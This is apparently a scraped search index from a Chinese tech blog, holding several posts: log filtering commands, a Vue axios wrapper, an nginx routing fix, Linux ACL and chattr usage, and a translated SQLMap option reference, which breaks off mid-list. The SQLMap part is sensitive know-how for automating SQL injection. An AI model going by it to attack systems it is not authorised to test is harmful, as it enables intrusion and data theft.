&lt;p&gt;日常工作中，网站如果遇到异常情况，经常需要查看访问日志来查找问题，由于日志文件庞大查找起来很不放便，所以需要进行一些过滤处理&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;筛选出可疑ip的访问日志&#34;&gt;筛选出可疑IP的访问日志&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cat example.log | grep &#39;127.0.0.1&#39; &amp;gt; 127.0.0.1.log
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;筛选出日志的某一列数据&#34;&gt;筛选出日志的某一列数据&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;awk -F &amp;quot;,&amp;quot; &#39;{print $2&amp;quot; &amp;quot;$3&amp;quot;}&#39; example.log
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;根据某列数据进行去重&#34;&gt;根据某列数据进行去重&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;awk -F &amp;quot;,&amp;quot;  &#39;!a[$2,$3]++&#39;  example.log
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;去除重复行&#34;&gt;去除重复行&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;sort example.log | uniq
&lt;/code&gt;&lt;/pre&gt;
">网站访问日志的日常操作</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/vue-zhong-axios-de-feng-zhuang/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;虽然，axios 是个优秀的 HTTP 库，但是，直接在项目中使用并不是那么方便，所以，我们需要对其进行一定程度上的配置封装，减少重复代码，方便调用。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;开始&#34;&gt;开始&lt;/h3&gt;
&lt;p&gt;其实，网上关于 axios 封装的代码不少，但是大部分都是在入口文件（main.js）中进行 axios 全局对象属性定义的形式进行配置，类似于如下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;axios.defaults.timeout = 10000

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该方案有两个不足，首先，axios 封装代码耦合进入入口文件，不方便后期维护；其次，使用 axios 全局对象属性定义的方式进行配置，代码过于零散。&lt;/p&gt;
&lt;p&gt;针对问题一，我使用了 Vue 源码结构中的一大核心思想——将功能拆分为文件，方便后期的维护。单独创建一个 &lt;code&gt;http.js&lt;/code&gt; 或者 &lt;code&gt;http.ts&lt;/code&gt; 文件，在文件中引入 axios 并对其进行封装配置，最后将其导出并挂载到 Vue 的原型上即可。此时，每次修改 axios 配置，只需要修改对应的文件即可，不会影响到不相关的功能。&lt;/p&gt;
&lt;p&gt;针对问题二，采用 axios 官方推荐的，通过配置项创建 axios 实例的方式进行配置封装。&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// http.js
import axios from &#39;axios&#39;
// 创建 axios 实例
const service = axios.create({
  // 配置项
})

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;根据环境设置-baseurl&#34;&gt;根据环境设置 baseURL&lt;/h3&gt;
&lt;p&gt;baseURL 属性是请求地址前缀，将自动加在 url 前面，除非 url 是个绝对地址。正常情况下，在开发环境下和生产模式下有着不同的 baseURL，所以，我们需要根据不同的环境切换不同的 baseURL。&lt;/p&gt;
&lt;p&gt;在开发模式下，由于有着 devServer 的存在，需要根据固定的 url 前缀进行请求地址重写，所以，在开发环境下，将 baseURL 设为某个固定的值，比如：&lt;code&gt;/apis&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在生产模式下，根据 Java 模块的请求前缀的不同，可以设置不同的 baseURL。&lt;/p&gt;
&lt;p&gt;具体代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// 根据 process.env.NODE_ENV 区分状态，切换不同的 baseURL
const service = axios.create({
	baseURL: process.env.NODE_ENV === &#39;production&#39; ? `/java` : &#39;/apis&#39;,
})

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;统一设置请求头&#34;&gt;统一设置请求头&lt;/h3&gt;
&lt;p&gt;在这里和大家聊一个问题，什么是封装？在我看来，封装是通过更少的调用代码覆盖更多的调用场景。&lt;/p&gt;
&lt;p&gt;由于，大部分情况下，请求头都是固定的，只有少部分情况下，会需要一些特殊的请求头，所以，在这里，我采用的方案是，将普适性的请求头作为基础配置。当需要特殊请求头时，将特殊请求头作为参数传入，覆盖基础配置。&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const service = axios.create({
    ...
	headers: {
        get: {
          &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded;charset=utf-8&#39;
          // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来
        },
        post: {
          &#39;Content-Type&#39;: &#39;application/json;charset=utf-8&#39;
          // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来
        }
  },
})

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;跨域-超时-响应码处理&#34;&gt;跨域、超时、响应码处理&lt;/h3&gt;
&lt;p&gt;axios 中，提供是否允许跨域的属性——withCredentials，以及配置超时时间的属性——timeout，通过这两个属性，可以轻松处理跨域和超时的问题。&lt;/p&gt;
&lt;p&gt;下面，我们来说说响应码处理：&lt;/p&gt;
&lt;p&gt;axios 提供了 validateStatus 属性，用于定义对于给定的 HTTP 响应状态码是 resolve 或 reject promise。所以，正常设置的情况下，我们会将状态码为 2 系列或者 304 的请求设为 resolve 状态，其余为 reject 状态。结果就是，我们可以在业务代码里，使用 catch 统一捕获响应错误的请求，从而进行统一处理。&lt;/p&gt;
&lt;p&gt;但是，由于我在代码里面使用了 async-await，而众所周知，async-await 捕获 catch 的方式极为麻烦，所以，在此处，我选择将所有响应都设为 resolve 状态，统一在 then 处理。&lt;/p&gt;
&lt;p&gt;此部分代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const service = axios.create({
	// 跨域请求时是否需要使用凭证
	withCredentials: true,
    // 请求 30s 超时
	timeout: 30000,
	validateStatus: function () {
		// 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常
		return true
	},
})

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;请求-响应处理&#34;&gt;请求、响应处理&lt;/h3&gt;
&lt;p&gt;在不使用 axios 的情况下，每次请求或者接受响应，都需要将请求或者响应序列化。&lt;/p&gt;
&lt;p&gt;而在 axios 中， &lt;code&gt;transformRequest&lt;/code&gt; 允许在向服务器发送请求前，修改请求数据；&lt;code&gt;transformResponse&lt;/code&gt; 在传递给 then/catch 前，允许修改响应数据。&lt;/p&gt;
&lt;p&gt;通过这两个钩子，可以省去大量重复的序列化代码。&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const service = axios.create({
    // 在向服务器发送请求前，序列化请求数据
    transformRequest: [function (data) {
        data = JSON.stringify(data)
        return data
    }],
    // 在传递给 then/catch 前，修改响应数据
    transformResponse: [function (data) {
        if (typeof data === &#39;string&#39; &amp;amp;&amp;amp; data.startsWith(&#39;{&#39;)) {
            data = JSON.parse(data)
        }
        return data
    }]
})

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;拦截器&#34;&gt;拦截器&lt;/h3&gt;
&lt;p&gt;拦截器，分为请求拦截器以及响应拦截器，分别在请求或响应被 then 或 catch 处理前拦截它们。&lt;/p&gt;
&lt;p&gt;之前提到过，由于 async-await 中 catch 难以处理的问题，所以将出错的情况也作为 resolve 状态进行处理。但这带来了一个问题，请求或响应出错的情况下，结果没有数据协议中定义的 msg 字段（消息）。所以，我们需要在出错的时候，手动生成一个符合返回格式的返回数据。&lt;/p&gt;
&lt;p&gt;由于，在业务中，没有需要在请求拦截器中做额外处理的需求，所以，请求拦截器的 resolve 状态，只需直接返回就可以了。&lt;/p&gt;
&lt;p&gt;请求拦截器代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// 请求拦截器
service.interceptors.request.use((config) =&amp;gt; {
	return config
}, (error) =&amp;gt; {
	// 错误抛到业务代码
    error.data = {}
    error.data.msg = &#39;服务器异常，请联系管理员！&#39;
    return Promise.resolve(error)
})

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再来聊聊响应拦截器，还是之前的那个问题，除了请求或响应错误，还有一种情况也会导致返回的消息体不符合协议规范，那就是状态码不为 2 系列或 304 时。此时，我们还是需要做一样的处理——手动生成一个符合返回格式的返回数据。但是，有一点不一样，我们还需要根据不同的状态码生成不同的提示信息，以方便处理上线后的问题。&lt;/p&gt;
&lt;p&gt;响应拦截器代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// 根据不同的状态码，生成不同的提示信息
const showStatus = (status) =&amp;gt; {
    let message = &#39;&#39;
    // 这一坨代码可以使用策略模式进行优化
    switch (status) {
        case 400:
            message = &#39;请求错误(400)&#39;
            break
        case 401:
            message = &#39;未授权，请重新登录(401)&#39;
            break
        case 403:
            message = &#39;拒绝访问(403)&#39;
            break
        case 404:
            message = &#39;请求出错(404)&#39;
            break
        case 408:
            message = &#39;请求超时(408)&#39;
            break
        case 500:
            message = &#39;服务器错误(500)&#39;
            break
        case 501:
            message = &#39;服务未实现(501)&#39;
            break
        case 502:
            message = &#39;网络错误(502)&#39;
            break
        case 503:
            message = &#39;服务不可用(503)&#39;
            break
        case 504:
            message = &#39;网络超时(504)&#39;
            break
        case 505:
            message = &#39;HTTP版本不受支持(505)&#39;
            break
        default:
            message = `连接出错(${status})!`
    }
    return `${message}，请检查网络或联系管理员！`
}

// 响应拦截器
service.interceptors.response.use((response) =&amp;gt; {
    const status = response.status
    let msg = &#39;&#39;
    if (status &amp;lt; 200 || status &amp;gt;= 300) {
        // 处理http错误，抛到业务代码
        msg = showStatus(status)
        if (typeof response.data === &#39;string&#39;) {
            response.data = { msg }
        } else {
            response.data.msg = msg
        }
    }
    return response
}, (error) =&amp;gt; {
    // 错误抛到业务代码
    error.data = {}
    error.data.msg = &#39;请求超时或服务器异常，请检查网络或联系管理员！&#39;
    return Promise.resolve(error)
})

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;tips1：友情提示，上面那一坨 switch-case 代码，可以使用策略模式进行优化~&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;tips2：如果有一些业务相关的需求，可以加在拦截器中，比如：loading、鉴权等~&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;支持-typescript&#34;&gt;支持 TypeScript&lt;/h3&gt;
&lt;p&gt;由于前段时间，我在部门内推了 TypeScript，为了满足自己的强迫症，将所有 js 文件改写为了 ts 文件。由于 axios 本身有 TypeScript 相关的支持，所以只需要把对应的类型导入，然后赋值即可。&lt;/p&gt;
&lt;h3 id=&#34;完整代码&#34;&gt;完整代码&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;// http.ts
import axios, { AxiosRequestConfig, AxiosResponse } from &#39;axios&#39;

const showStatus = (status: number) =&amp;gt; {
  let message = &#39;&#39;
  switch (status) {
    case 400:
      message = &#39;请求错误(400)&#39;
      break
    case 401:
      message = &#39;未授权，请重新登录(401)&#39;
      break
    case 403:
      message = &#39;拒绝访问(403)&#39;
      break
    case 404:
      message = &#39;请求出错(404)&#39;
      break
    case 408:
      message = &#39;请求超时(408)&#39;
      break
    case 500:
      message = &#39;服务器错误(500)&#39;
      break
    case 501:
      message = &#39;服务未实现(501)&#39;
      break
    case 502:
      message = &#39;网络错误(502)&#39;
      break
    case 503:
      message = &#39;服务不可用(503)&#39;
      break
    case 504:
      message = &#39;网络超时(504)&#39;
      break
    case 505:
      message = &#39;HTTP版本不受支持(505)&#39;
      break
    default:
      message = `连接出错(${status})!`
  }
  return `${message}，请检查网络或联系管理员！`
}

const service = axios.create({
  // 联调
  baseURL: process.env.NODE_ENV === &#39;production&#39; ? `/` : &#39;/apis&#39;,
  headers: {
    get: {
      &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded;charset=utf-8&#39;
    },
    post: {
      &#39;Content-Type&#39;: &#39;application/json;charset=utf-8&#39;
    }
  },
  // 是否跨站点访问控制请求
  withCredentials: true,
  timeout: 30000,
  transformRequest: [(data) =&amp;gt; {
    data = JSON.stringify(data)
    return data
  }],
  validateStatus () {
    // 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常
    return true
  },
  transformResponse: [(data) =&amp;gt; {
    if (typeof data === &#39;string&#39; &amp;amp;&amp;amp; data.startsWith(&#39;{&#39;)) {
      data = JSON.parse(data)
    }
    return data
  }]
})

// 请求拦截器
service.interceptors.request.use((config: AxiosRequestConfig) =&amp;gt; {
    return config
}, (error) =&amp;gt; {
    // 错误抛到业务代码
    error.data = {}
    error.data.msg = &#39;服务器异常，请联系管理员！&#39;
    return Promise.resolve(error)
})

// 响应拦截器
service.interceptors.response.use((response: AxiosResponse) =&amp;gt; {
    const status = response.status
    let msg = &#39;&#39;
    if (status &amp;lt; 200 || status &amp;gt;= 300) {
        // 处理http错误，抛到业务代码
        msg = showStatus(status)
        if (typeof response.data === &#39;string&#39;) {
            response.data = {msg}
        } else {
            response.data.msg = msg
        }
    }
    return response
}, (error) =&amp;gt; {
    // 错误抛到业务代码
    error.data = {}
    error.data.msg = &#39;请求超时或服务器异常，请检查网络或联系管理员！&#39;
    return Promise.resolve(error)
})

export default service

&lt;/code&gt;&lt;/pre&gt;
">Vue 中 axios 的封装</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/nginx-fu-wu-bu-shu-vue-xiang-mu-hou-chu-xian-404-wen-ti/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;在本地与部署线上环境后都没有问题，使用‘history’路由模式，部署线上环境后，首页能正常访问，点击其他页面，出现 404 Not Found&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;解决&#34;&gt;解决&lt;/h3&gt;
&lt;p&gt;刷新页面时访问的资源在服务端找不到，因为此时vue-router设置路由地址被当作url地址，此时的地址路径不是真实存在的，所以出现404现象&lt;/p&gt;
&lt;p&gt;在服务端nginx配置里添加vue-route的跳转设置（这里首页是index.html，如果是index.php就在下面对应位置替换），配置如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server
{
    listen 80;
    server_name www.test.com;
    index index.php index.html index.htm default.php default.htm default.html;
    root /www/wwwroot/test/dist;

    #vue-router配置
    location / {
        try_files $uri $uri/ @router;
        index index.html;
    }
    location @router {
        rewrite ^.*$ /index.html last;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重启 nginx 后，页面可以正常访问&lt;/p&gt;
">Nginx 服务部署 Vue 项目后,出现 404 问题</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/linux-wen-jian-fang-wen-kong-zhi-lie-biao/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;如果希望对某个指定的用户进行单独的权限控制，就需要用到文件的访问控制列表（ACL）了。通俗来讲，基于普通文件或目录设置ACL其实就是针对指定的用户或用户组设置文件或目录的操作权限。另外，如果针对某个目录设置了ACL，则目录中的文件会继承其ACL；若针对文件设置了ACL，则文件不再继承其所在目录的ACL。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;setfacl-命令&#34;&gt;setfacl 命令&lt;/h3&gt;
&lt;p&gt;setfacl命令用于管理文件的ACL规则，格式为“setfacl [参数] 文件名称”。&lt;/p&gt;
&lt;p&gt;文件的ACL提供的是在所有者、所属组、其他人的读/写/执行权限之外的特殊权限控制，使用setfacl命令可以针对单一用户或用户组、单一文件或目录来进行读/写/执行权限的控制。&lt;/p&gt;
&lt;p&gt;其中，针对目录文件需要使用-R递归参数；针对普通文件则使用-m参数；如果想要删除某个文件的ACL，则可以使用-b参数。&lt;/p&gt;
&lt;p&gt;设置用户在/root目录上的权限：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@linuxprobe ~]# setfacl -Rm u:linuxprobe:rwx /root
[root@linuxprobe ~]# su - linuxprobe
Last login: Sat Mar 21 15:45:03 CST 2017 on pts/1
[linuxprobe@linuxprobe ~]$ cd /root
[linuxprobe@linuxprobe root]$ ls
anaconda-ks.cfg Downloads Pictures Public
[linuxprobe@linuxprobe root]$ cat anaconda-ks.cfg
[linuxprobe@linuxprobe root]$ exit
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;常用的ls命令是看不到ACL表信息的，但是却可以看到文件的权限最后一个点（.）变成了加号（+）,这就意味着该文件已经设置了ACL了。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@linuxprobe ~]# ls -ld /root
dr-xrwx---+ 14 root root 4096 May 4 2017 /root
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;getfacl-命令&#34;&gt;getfacl 命令&lt;/h3&gt;
&lt;p&gt;getfacl命令用于显示文件上设置的ACL信息，格式为“getfacl 文件名称”。&lt;/p&gt;
&lt;p&gt;想要设置ACL，用的是setfacl命令；要想查看ACL，则用的是getfacl命令。&lt;/p&gt;
&lt;p&gt;使用getfacl命令显示在root管理员家目录上设置的所有ACL信息。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@linuxprobe ~]# getfacl /root
getfacl: Removing leading &#39;/&#39; from absolute path names
# file: root
# owner: root
# group: root
user::r-x
user:linuxprobe:rwx
group::r-x
mask::rwx
other::---
&lt;/code&gt;&lt;/pre&gt;
">Linux文件访问控制列表</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/linux-wen-jian-de-yin-cang-shu-xing/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;Linux系统中的文件除了具备一般权限和特殊权限之外，还有一种隐藏权限，即被隐藏起来的权限，默认情况下不能直接被用户发觉。明明权限充足但却无法删除某个文件的情况，或者仅能在日志文件中追加内容而不能修改或删除内容，这在一定程度上阻止了黑客篡改系统日志的图谋，因此这种“奇怪”的文件也保障了Linux系统的安全性。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;chattr-命令&#34;&gt;chattr 命令&lt;/h3&gt;
&lt;p&gt;chattr命令用于设置文件的隐藏权限，格式为“chattr [参数] 文件”。如果想要把某个隐藏功能添加到文件上，则需要在命令后面追加“+参数”，如果想要把某个隐藏功能移出文件，则需要追加“-参数”&lt;/p&gt;
&lt;p&gt;共有以下8种模式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a：让文件或目录仅供附加用途；&lt;/li&gt;
&lt;li&gt;b：不更新文件或目录的最后存取时间；&lt;/li&gt;
&lt;li&gt;c：将文件或目录压缩后存放；&lt;/li&gt;
&lt;li&gt;d：将文件或目录排除在倾倒操作之外；&lt;/li&gt;
&lt;li&gt;i：不得任意更动文件或目录；&lt;/li&gt;
&lt;li&gt;s：保密性删除文件或目录；&lt;/li&gt;
&lt;li&gt;S：即时更新文件或目录；&lt;/li&gt;
&lt;li&gt;u：预防意外删除。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;选项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-R：递归处理，将指令目录下的所有文件及子目录一并处理；&lt;/li&gt;
&lt;li&gt;-v&amp;lt;版本编号&amp;gt;：设置文件或目录版本；&lt;/li&gt;
&lt;li&gt;-V：显示指令执行过程；&lt;/li&gt;
&lt;li&gt;+&amp;lt;属性&amp;gt;：开启文件或目录的该项属性；&lt;/li&gt;
&lt;li&gt;-&amp;lt;属性&amp;gt;：关闭文件或目录的该项属性；&lt;/li&gt;
&lt;li&gt;=&amp;lt;属性&amp;gt;：指定文件或目录的该项属性。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;新建一个普通文件，并为其设置不允许删除与覆盖（+a参数）权限，然后再尝试将这个文件删除：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@linuxprobe ~]# echo &amp;quot;for Test&amp;quot; &amp;gt; linuxprobe
[root@linuxprobe ~]# chattr +a linuxprobe
[root@linuxprobe ~]# rm linuxprobe
rm: remove regular file ‘linuxprobe’? y
rm: cannot remove ‘linuxprobe’: Operation not permitted
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;lsattr-命令&#34;&gt;lsattr 命令&lt;/h3&gt;
&lt;p&gt;lsattr命令用于显示文件的隐藏权限，格式为“lsattr [参数] 文件”。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。&lt;/li&gt;
&lt;li&gt;-D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。&lt;/li&gt;
&lt;li&gt;-R：递归的操作方式；&lt;/li&gt;
&lt;li&gt;-V：显示指令的版本信息；&lt;/li&gt;
&lt;li&gt;-a：列出目录中的所有文件，包括隐藏文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;lsattr经常使用的几个选项-D，-E，-R这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用lsattr时，必须指出具体的设备名，用-l选项指出要显示设备的逻辑名称，否则要用-c，-s，-t等选项唯一的确定某个已存在的设备。&lt;/p&gt;
&lt;p&gt;在Linux系统中，文件的隐藏权限必须使用lsattr命令来查看，平时使用的ls之类的命令则看不出端倪&lt;/p&gt;
&lt;p&gt;一旦使用lsattr命令后，文件上被赋予的隐藏权限马上就会原形毕露。此时可以按照显示的隐藏权限的类型（字母），使用chattr命令将其去掉：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@linuxprobe ~]# lsattr linuxprobe
-----a---------- linuxprobe
[root@linuxprobe ~]# chattr -a linuxprobe
[root@linuxprobe ~]# lsattr linuxprobe 
---------------- linuxprobe
[root@linuxprobe ~]# rm linuxprobe 
rm: remove regular file ‘linuxprobe’? y
&lt;/code&gt;&lt;/pre&gt;
">Linux文件的隐藏属性</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/sqlmap-ji-ben-shi-yong/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;options选项&#34;&gt;Options（选项）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Usage: python sqlmap.py [options]

Options（选项）:

-h, --help Show basic help message and exit
## 展示帮助文档 参数

-hh Show advanced help message and exit
## 展示详细帮助文档参数

--version Show program&#39;s version number and exit
## 显示程序的版本号

-v VERBOSE Verbosity level: 0-6 (default 1)
## 详细级别：0-6（默认为1）
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;target目标&#34;&gt;Target（目标）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Target（目标）:

At least one of these options has to be provided to define the target(s)

-d DIRECT Connection string for direct database connection
## 指定具体数据库

-u URL, --url=URL Target URL (e.g. &amp;quot;http://www.site.com/vuln.php?id=1&amp;quot;)
## 目标URL

-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file
## 解析目标(s)从Burp或WebScarab代理日志文件

-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file
## 解析目标(s)从远程站点地图文件(.xml)

-m BULKFILE Scan multiple targets given in a textual file
## 扫描文本文件中给出的多个目标

-r REQUESTFILE Load HTTP request from a file
## 从本地文件加载HTTP请求 ，多用于post注入。

-g GOOGLEDORK Process Google dork results as target URLs
## 处理Google的结果作为目标URL。

-c CONFIGFILE Load options from a configuration INI file
## 从INI配置文件中加载选项。
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;request请求&#34;&gt;Request（请求）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Request（请求）:
​
These options can be used to specify how to connect to the target URL
## 这些选项可以用来指定如何连接到目标URL。
​
--method=METHOD Force usage of given HTTP method (e.g. PUT)
## 强制使用给定的HTTP方法（e.g. PUT）
​
--data=DATA Data string to be sent through POST
## 通过POST发送的数据字符串
​
--param-del=PARA.. Character used for splitting parameter values
## 用于拆分参数值的字符
​
--cookie=COOKIE HTTP Cookie header value HTTP
## Cookie头的值
​
--cookie-del=COO.. Character used for splitting cookie values
## 用于分割Cookie值的字符

--load-cookies=L.. File containing cookies in Netscape/wget format
## 包含Netscape / wget格式的cookie的文件

--drop-set-cookie Ignore Set-Cookie header from response
## 从响应中忽略Set-Cookie头

--user-agent=AGENT HTTP User-Agent header value
## 指定 HTTP User - Agent头

--random-agent Use randomly selected HTTP User-Agent header value
##  使用随机选定的HTTP User - Agent头

--host=HOST HTTP Host header value
## HTTP主机头值

--referer=REFERER HTTP Referer header value
##  指定 HTTP Referer头

-H HEADER, --hea.. Extra header (e.g. &amp;quot;X-Forwarded-For: 127.0.0.1&amp;quot;)
## 额外header

--headers=HEADERS Extra headers (e.g. &amp;quot;Accept-Language: fr\\nETag: 123&amp;quot;)
## 额外header

--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP
## 认证类型(Basic, Digest, NTLM or PKI)

--auth-cred=AUTH.. HTTP authentication credentials (name:password)
##  HTTP认证凭证(name:password)

--auth-file=AUTH.. HTTP authentication PEM cert/private key file
## HTTP认证 PEM认证/私钥文件

--ignore-401 Ignore HTTP Error 401 (Unauthorized)
## 忽略HTTP错误401

--proxy=PROXY Use a proxy to connect to the target URL
## 使用代理连接到目标网址

--proxy-cred=PRO.. Proxy authentication credentials (name:password)
## 代理认证证书(name:password)

--proxy-file=PRO.. Load proxy list from a file
## 从文件中加载代理列表

--ignore-proxy Ignore system default proxy settings
## 忽略系统默认代理设置

--tor Use Tor anonymity network
## 使用Tor匿名网络

--tor-port=TORPORT Set Tor proxy port other than default
##  设置Tor代理端口而不是默认值

--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)
## 设置Tor代理类型

--check-tor Check to see if Tor is used properly
## 检查Tor是否正确使用

--delay=DELAY Delay in seconds between each HTTP request
## 每个HTTP请求之间的延迟（秒）

--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)
## 秒超时连接前等待（默认30）

--retries=RETRIES Retries when the connection timeouts (default 3)
##  连接超时时重试（默认值3）

--randomize=RPARAM Randomly change value for given parameter(s)
## 随机更改给定参数的值(s)

--safe-url=SAFEURL URL address to visit frequently during testing
## 在测试期间频繁访问的URL地址

--safe-post=SAFE.. POST data to send to a safe URL
## POST数据发送到安全URL

--safe-req=SAFER.. Load safe HTTP request from a file
## 从文件加载安全HTTP请求

--safe-freq=SAFE.. Test requests between two visits to a given safe URL
## 在两次访问给定安全网址之间测试请求

--skip-urlencode Skip URL encoding of payload data
## 跳过有效载荷数据的URL编码

--csrf-token=CSR.. Parameter used to hold anti-CSRF token
## 参数用于保存anti-CSRF令牌

--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token
## 提取anti-CSRF URL地址访问令牌

--force-ssl Force usage of SSL/HTTPS
## 强制使用SSL /HTTPS

--hpp Use HTTP parameter pollution method
## 使用HTTP参数pollution的方法

--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码&amp;quot;import hashlib;id2=hashlib.md5(id).hexdigest()&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;optimization优化&#34;&gt;Optimization（优化）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Optimization（优化）:
​
These options can be used to optimize the performance of sqlmap
## 这些选项可用于优化sqlmap的性能
​
-o Turn on all optimization switches
## 开启所有优化开关
​
--predict-output Predict common queries output
## 预测常见的查询输出
​
--keep-alive Use persistent HTTP(s) connections
## 使用持久的HTTP（S）连接
​
--null-connection Retrieve page length without actual HTTP response body
## 从没有实际的HTTP响应体中检索页面长度
​
--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)
## 最大的HTTP（S）请求并发量（默认为1）
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;injection注入&#34;&gt;Injection（注入）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Injection（注入）:
​
These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts
##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
​
-p TESTPARAMETER Testable parameter(s)
## 可测试的参数（S）
​
--skip=SKIP Skip testing for given parameter(s)
## 跳过对给定参数的测试
​
--skip-static Skip testing parameters that not appear to be dynamic
## 跳过测试不显示为动态的参数
​
--param-exclude=.. Regexp to exclude parameters from testing (e.g. &amp;quot;ses&amp;quot;)
## 使用正则表达式排除参数进行测试（e.g. &amp;quot;ses&amp;quot;）
​
--dbms=DBMS Force back-end DBMS to this value
## 强制后端的DBMS为此值
​
--dbms-cred=DBMS.. DBMS authentication credentials (user:password)
## DBMS认证凭证(user:password)
​
--os=OS Force back-end DBMS operating system to this value
## 强制后端的DBMS操作系统为这个值
​
--invalid-bignum Use big numbers for invalidating values
## 使用大数字使值无效
​
--invalid-logical Use logical operations for invalidating values
## 使用逻辑操作使值无效
​
--invalid-string Use random strings for invalidating values
## 使用随机字符串使值无效
​
--no-cast Turn off payload casting mechanism
## 关闭有效载荷铸造机制
​
--no-escape Turn off string escaping mechanism
## 关闭字符串转义机制
​
